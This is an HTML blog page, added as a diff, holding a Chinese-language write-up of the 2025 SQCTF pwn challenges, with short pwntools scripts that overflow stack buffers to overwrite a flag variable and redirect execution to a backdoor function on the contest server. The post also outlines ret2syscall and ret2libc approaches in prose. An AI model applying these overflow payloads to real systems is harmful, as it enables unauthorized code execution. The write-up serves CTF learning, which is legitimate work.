@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - 2025SQCTF</title>
+<meta name="description" content="很荣幸参加了第四届SQCTF，作为新生赛，难度还可以，因为本人能力还不够，并没能够akpwn，还得再努力努力（毕竟是想打XCTF的，这点实力是肯定不行的。 浅红欺醉粉，肯信有江梅一道简单到不能再简单的nc签到题。 领取你的小猫娘这是一道64位的题，基本没开什么保护。 这里可以看到有一个后门函数，其判断条件为v5的值为真">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>1058 字</span>
+        </div>
+        <h1>2025SQCTF</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <p>很荣幸参加了第四届SQCTF，作为新生赛，难度还可以，因为本人能力还不够，并没能够akpwn，还得再努力努力（毕竟是想打XCTF的，这点实力是肯定不行的。</p>
+<h1 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h1><p>一道简单到不能再简单的nc签到题。</p>
+<h1 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h1><p>这是一道64位的题，基本没开什么保护。</p>
+<p><img src="/images/cat.png"><img src="/images/cat.backdoor"></p>
+<p>这里可以看到有一个后门函数，其判断条件为v5的值为真，因为我们能输入的是v4，而且观察栈上结构可以知道地址相差0x50-4。所以可以通过输入覆盖到v5并将v5的值变为真即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>io=remote(&#x27;challenge.qsnctf.com&#x27;,31547)<br><br>payload=cyclic(0x50-4)+p64(1)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h1><p>这是一道64位的题，开启了NX保护，因此不好使用shellcode。</p>
+<p><img src="/images/gift"><img src="/images/gift.1"></p>
+<p>通过IDA可以发现存在明显栈溢出，并且有后门函数，所以这题是一道简单的ret2text，通过栈溢出覆盖返回地址为后门函数。（注意堆栈平衡。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;challenge.qsnctf.com&#x27;,32767)<br>elf=ELF(&#x27;./gift&#x27;)<br>backdoor=elf.sym[&#x27;gift&#x27;]<br>payload=cyclic(64+8)+p64(0x40101a)+p64(0x4011B6)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h1><p>这是一道64位的题目，基本没开什么保护。</p>
+<p><img src="/images/pwn01">并且有&#x2F;bin&#x2F;sh的地址，但是没有system函数，所以我第一反应应该是64位的ret2syscall。</p>
+<p>32位与64位syscall的相同点是都必须调用寄存器，都想构造出execve(&#x2F;bin&#x2F;sh,0,0)这种结构。</p>
+<p>两者最主要的区别是系统调用号、传参以及最后的中断命令不一样，但是大致思路都是一样的，在这就不多说了。（主要是找不到当时写的exp了，又懒得再写一遍。</p>
+<h1 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h1><p>这也是一道简单的64位题目。</p>
+<p>我感觉是一道简单的ret2libc的题目，只需要满足一些特定的条件就能进入溢出函数了，然后就是普通的libc了，在此也不想做过多的介绍了。</p>
+
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/0xGame2024-%E5%A4%8D%E7%8E%B0/">
+            <span>上一篇</span>
+            <strong>0xGame2024-复现</strong>
+          </a>
+        
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
